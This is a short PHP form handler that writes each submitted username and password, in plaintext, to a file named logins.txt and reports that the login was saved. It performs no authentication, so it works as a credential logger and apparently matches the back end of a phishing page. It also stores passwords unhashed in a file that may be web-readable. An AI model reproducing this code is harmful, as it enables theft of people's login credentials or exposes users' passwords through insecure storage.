<?php
// Check if form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get username and password from POST request
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Define the file where data will be stored
    $file = 'logins.txt';

    // Format data to write
    $data = "Username: $username, Password: $password" . PHP_EOL;

    // Append data to the file
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Redirect to a success page or show a message
    echo "Login information has been saved successfully.";
}
?>
